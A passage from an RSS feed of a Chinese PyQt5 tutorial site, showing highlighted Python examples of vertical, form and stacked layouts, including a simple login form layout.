<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">resize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">300</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">300</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 设置标题</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWindowTitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"垂直布局"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 垂直布局</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        layout </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QVBoxLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 作用是在布局器中增加一个伸缩量，里面的参数表示QSpacerItem的个数，默认值为零</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 会将你放在layout中的空间压缩成默认的大小</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 下面的笔试1：1：1：2</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addStretch</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 按钮1</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn1 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QPushButton</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"按钮1"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 添加到布局器中</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # layout.addWidget(btn1, Qt.AlignmentFlag.AlignTop)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(btn1)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addStretch</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 按钮2</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn2 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QPushButton</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"按钮2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 添加到布局器</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(btn2)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addStretch</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 按钮3</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn3 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QPushButton</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"按钮3"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 添加到布局器</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(btn3)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addStretch</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(layout)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 创建一个QWidget子类</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> MyWindow</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行效果：</p>
<p></p>
<p>水平布局</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication, QWidget, QGroupBox, QVBoxLayout, QHBoxLayout, QRadioButton</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> MyWindow</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QWidget</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 最外层的垂直布局，包含两部分：爱好和性别</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        container </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QVBoxLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        #</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>004-布局2</title>
      <link>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/004-%E5%B8%83%E5%B1%802.html</link>
      <guid>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/004-%E5%B8%83%E5%B1%802.html</guid>
      <source url="https://www.geekery.cn/rss.xml">004-布局2</source>
      <description>004-布局2 一、QFormLayout 一般适用于提交数据form表单。比如： 登录，注册类似的场景 运行效果： image-20201122194840726 二、QStackedLayout 提供了多页面切换的布局，一次只能看到一个界面。 抽屉布局 效果： image-20201122203450056</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>一、QFormLayout</h2>
<p>一般适用于提交数据<strong>form表单</strong>。比如： 登录，注册类似的场景</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtCore </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> Qt</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QVBoxLayout, QFormLayout, QLineEdit, QPushButton, QApplication, QWidget</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> MyWindow</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QWidget</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 设定当前Widget的宽高(可以拉伸大小)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # self.resize(300, 200)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 禁止改变宽高（不可以拉伸）</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setFixedSize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">300</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">150</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 外层容器</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        container </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QVBoxLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 表单容器</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        form_layout </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QFormLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 创建1个输入框</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        edit </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QLineEdit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        edit.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setPlaceholderText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"请输入账号"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        form_layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addRow</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"账号："</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, edit)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 创建另外1个输入框</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        edit2 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QLineEdit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        edit2.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setPlaceholderText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"请输入密码"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        form_layout.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addRow</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"密码："</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, edit2)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 将from_layout添加到垂直布局器中</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        container.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(form_layout)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 按钮</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        login_btn </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QPushButton</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"登录"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        login_btn.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setFixedSize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">100</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">30</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 把按钮添加到容器中，并且指定它的对齐方式</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        container.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(login_btn, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">alignment</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Qt.AlignRight)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 设置当前Widget的布局器，从而显示这个布局器中的子控件</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setLayout</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(container)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> MyWindow</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行效果：</p>
<p></p>
<h2>二、QStackedLayout</h2>
<p>提供了多页面切换的布局，一次只能看到一个界面。 <strong>抽屉布局</strong></p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication, QWidget, QVBoxLayout, QPushButton, QStackedLayout, QLabel</span></span>
